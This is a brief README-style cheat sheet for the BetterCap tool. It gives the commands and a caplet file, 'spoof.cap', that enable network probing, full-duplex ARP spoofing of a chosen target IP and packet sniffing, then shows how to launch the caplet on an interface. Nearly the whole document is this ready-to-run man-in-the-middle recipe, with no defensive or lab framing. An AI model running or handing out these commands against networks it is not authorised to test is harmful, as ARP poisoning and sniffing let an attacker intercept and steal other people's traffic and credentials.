# BetterCap

![bettercap](https://raw.githubusercontent.com/bettercap/media/master/logo.png)


## To start with the program

bettercap iface **name_of_interface**


## spoof.cap

net.probe on
</br>set arp.spoof.full duplex true
</br>set arp.spoof.target **target IP**
</br>arp.spoof on
</br>net.sniff on

## bettercap caplet

Copy the commands from **spoof.cap**, then edit it with the **target_IP** and save it in some directory. Now, move to the particular directory and run the command below:
</br>bettercap -iface **name_of_interface** -caplet spoof.cap
